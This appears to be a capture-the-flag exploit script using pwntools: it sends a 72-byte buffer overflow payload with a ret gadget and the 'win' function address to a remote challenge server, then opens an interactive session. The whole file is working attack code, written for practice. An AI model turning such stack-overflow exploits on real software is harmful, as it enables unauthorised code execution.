from pwn import *

elf = ELF("./chall")
p = remote("chall-ctf.ara-its.id", 4040)

win = elf.symbols['win']

payload = b"A"*72 + p64(0x40101a) + p64(win)

p.sendlineafter(b"Enter your name: ", payload)

p.interactive()